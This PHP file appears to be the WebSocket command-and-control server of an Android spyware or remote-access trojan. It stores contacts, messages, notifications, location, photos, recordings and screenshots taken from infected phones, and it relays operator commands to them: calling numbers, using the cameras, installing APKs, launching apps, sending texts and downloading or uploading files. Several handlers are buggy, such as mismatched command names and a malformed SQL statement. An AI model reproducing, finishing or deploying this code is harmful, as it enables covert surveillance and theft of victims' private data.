<?php

namespace C2;

use Ratchet\ConnectionInterface;
use Ratchet\RFC6455\Messaging\MessageInterface;
use Ratchet\WebSocket\MessageComponentInterface;

class C2WebSocket implements MessageComponentInterface {

    protected $clients;

    private ConnectionInterface $server;

    /** @var Database $database Database instance */
    private Database $database;

    public function __construct(Database $database)
    {
        $this->clients = new \SplObjectStorage();
        $this->database = $database;
    }

    public function onOpen(ConnectionInterface $conn)
    {
        $this->clients->attach($conn);
        if (isset($this->server))
            $this->server->send(time() . " Connection estbalished by " . $conn->resourceId);
    }

    public function onMessage(ConnectionInterface $conn, MessageInterface $msg)
    {
        $data = json_decode($msg->getContents());
        var_dump($msg);

        if ($data['type'] === 'client')
            $this->clientConnection($conn, $data);
        
        if ($data['type'] === 'server')
            $this->serverConnection($conn, $data);

        if ($data === "js server")
            $this->server = $conn;

        if (isset($this->server))
            $this->server->send(time() . " " . $data);
    }

    public function onClose(ConnectionInterface $conn)
    {
        $this->clients->detach($conn);
        if (isset($this->server))
            $this->server->send(time() . " Connection closed by " . $conn->resourceId);
    }

    public function onError(ConnectionInterface $conn, \Exception $e)
    {
        $conn->close();
    }

    /**
     * Handle client connections
     * 
     * @param ConnectionInterface $conn
     * @param array $data
     */
    private function clientConnection(ConnectionInterface $conn, array $data): void
    {
        $clientID = $data['id'];
        $this->updateClientWebSocketIDinDatabase($clientID, $conn->resourceId); //???????

        switch ($data['res']) {
            case "contact":
                $query = "INSERT INTO CONTACT(client_id, name, number) VALUES(?, ?, ?)";
                $name = base64_decode($data['name']);
                $number = base64_decode($data['number']);
                $this->database->insert($query, [$clientID, $name, $number]);
                break;
            case "image":
                $query = "INSERT INTO IMAGE(client_id, filename, timestamp) VALUES(?, ?, ?)";
                $filename = base64_decode($data['filename']);
                $timestamp = $data['timestamp'];
                $this->database->insert($query, [$clientID, $filename, $timestamp]);
                break;
            case "location":
                $query = "INSERT INTO LOCATION(client_id, latitude, longitude altitude) VALUES(?, ?, ?, ?)";
                $latitude = base64_decode($data['latitude']);
                $longitude = base64_decode($data['longitude']);
                $altitude = base64_decode($data['altitude']);
                $this->database->insert($query, [$clientID, $latitude, $longitude, $altitude]);
                break;
            case "message":
                $query = "INSERT INTO MESSAGE(client_id, sender, content, timestamp) VALUES(?, ?, ?, ?)";
                $sender = base64_decode($data['sender']);
                $content = base64_decode($data['content']);
                $timestamp = $data['timestamp'];
                $this->database->insert($query, [$sender, $content, $timestamp]);
                break;
            case "notification":
                $query = "INSERT INTO NOTIFICATION(client_id, sender, content, timestamp) VALUES(?, ?, ?, ?)";
                $sender = base64_decode($data['sender']);
                $content = base64_decode($data['content']);
                $timestamp = $data['timestamp'];
                $this->database->insert($query, [$clientID, $sender, $content, $timestamp]);
                break;
            case "recording":
                $query = "INSERT INTO RECORDING(client_id, filename, timestamp) VALUES(?, ?, ?)";
                $filename = base64_decode($data['filename']);
                $timestamp = $data['timestamp'];
                $this->database->insert($query, [$clientID, $filename, $timestamp]);
                break;
            case "screesnshot":
                $query = "INSERT INTO SCREENSHOT(client_id, filename, timestamp) VALUES(?, ?, ?)";
                $filename = base64_decode($data['filename']);
                $timestamp = $data['timestamp'];
                $this->database->insert($query, [$clientID, $filename, $timestamp]);
                break;
            case "video":
                $query = "INSERT INTO VIDEO(client_id, filename, timestamp) VALUES(?, ?, ?)";
                $filename = base64_decode($data['filename']);
                $timestamp = $data['timestamp'];
                $this->database->insert($query, [$clientID, $filename, $timestamp]);
                break;
            default:
                break;
        }
    }

    /**
     * Handle connections from the server
     * 
     * @param ConnectionInterface $conn
     * @param array $data
     */
    private function serverConnection(ConnectionInterface $conn, array $data): void
    {
        $clientWebSocketID = $data['web_socket_id'];
        $client = $this->getClient($clientWebSocketID);
        
        if (is_null($client))
            return;

        $json = null;

        if ($this->isClientConnected($clientWebSocketID)) {
            switch ($data['cmd']) {
                case "CALL":
                    $json = json_encode([
                        "cmd" => "CALL",
                        "number" => $data['number'],
                    ]);
                    break;
                case "CAMERA_BACK":
                    $json = json_encode(["cmd" => "CAMERA_BACK"]);
                    break;
                case "CAMERA_FRONT":
                    $json = json_encode(["cmd" => "CAMERA_FRONT"]);
                    break;
                case "DELETE_CONTACT":
                    $json = json_encode([
                        "cmd" => "DOWNLOAD_FILE",
                        "name" => $data['name'],
                        "number" => $data['number']
                    ]);
                    break;
                case "DOWNLOAD_FILE":
                    $json = json_encode([
                        "cmd" => "DOWNLOAD_FILE",
                        "url" => $data['url'],
                        "filename" => $data['filename']
                    ]);
                    break;
                case "INSTALL_APK":
                    $json = json_encode([
                        "cmd" => "INSTALL_APK",
                        "path" => $data['path']
                    ]);
                    break;
                case "LAUNCH_APP":
                    $json = json_encode([
                        "cmd" => "LAUNCH_APP",
                        "package" => $data['package']
                    ]);
                    break;
                case "LIST_INSTALLED_APPS":
                    $json = json_encode(["cmd" => "LIST_INSTALLED_APPS"]);
                    break;
                case "LIST_FILES":
                    $json = json_encode([
                        "cmd" => "VIDEO",
                        "path" => $data['path']
                    ]);
                    break;
                case "LOCATION":
                    $json = json_encode(["cmd" => "LOCATION"]);
                    break;
                case "READ_CONTACTS":
                    $json = json_encode(["cmd" => "READ_CONTACTS"]);
                    break;
                case "SCREENSHOT":
                    $json = json_encode(["cmd" => "SCREENSHOT"]);
                    break;
                case "TEXT":
                    $json = json_encode([
                        "cmd" => "WRITE_CONTACT",
                        "number" => $data['number'],
                        "message" => $data['message']
                    ]);
                    break;
                case "UPLOAD_FILE":
                    $json = json_encode([
                        "cmd" => "WRITE_CONTACT",
                        "path" => $data['path'],
                        "url" => $data['url']
                    ]);
                    break;
                case "VIDEO":
                    $json = json_encode(["cmd" => "VIDEO"]);
                    break;
                case "WRITE_CONTACT":
                    $json = json_encode([
                        "cmd" => "WRITE_CONTACT",
                        "name" => $data['name'],
                        "number" => $data['number']
                    ]);
                    break;
                default;
                    break;
            }
            
            $client->send($json);
        }
    }

    /**
     * Check if a particular client is connected
     * 
     * @param int $webSocketConnectionID
     * 
     * @return bool
     */
    private function isClientConnected(int $webSocketConnectionID): bool
    {
        foreach ($this->clients as $client) {
            if ($client->getId() === $webSocketConnectionID)
                return true;
        }

        return false;
    }

    /**
     * Get a client
     * 
     * @param int $webSocketConnectionID
     */
    private function getClient(int $webSocketConnectionID)
    {
        foreach ($this->clients as $client) {
            if ($client->getId() === $webSocketConnectionID)
                return $client;
        }

        return null;
    }

    /**
     * Update client web socket ID in database
     * 
     * @param int $clientID
     * @param int $webSocketID
     */
    private function updateClientWebSocketIDinDatabase(int $clientID, int $webSocketID): void
    {
        $query = "UPDATE CLIENT SET web_socket_id=? WHERE id=?";
        $this->database->update($query, [$clientID, $webSocketID]);
    }
}